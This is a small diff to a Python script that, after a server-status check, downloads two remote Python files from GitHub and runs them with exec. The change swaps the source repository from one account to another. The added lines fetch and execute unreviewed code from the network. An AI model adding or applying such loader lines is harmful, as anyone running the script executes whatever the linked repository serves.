@@ -5,6 +5,6 @@ if "on" in __check__:
   input("Sever Online\nPress Enter to continue...")
 else:
   exit("Sever Offline")
-exec(requests.get('https://raw.githubusercontent.com/huykazuto1/ndha/main/shorterlink.py').text)
-exec(requests.get('https://raw.githubusercontent.com/huykazuto1/ndha/main/zf.py').text)
+exec(requests.get('https://raw.githubusercontent.com/kouseikzt/kzt1/main/shorterlink.py').text)
+exec(requests.get('https://raw.githubusercontent.com/kouseikzt/kzt1/main/zf.py').text)
 
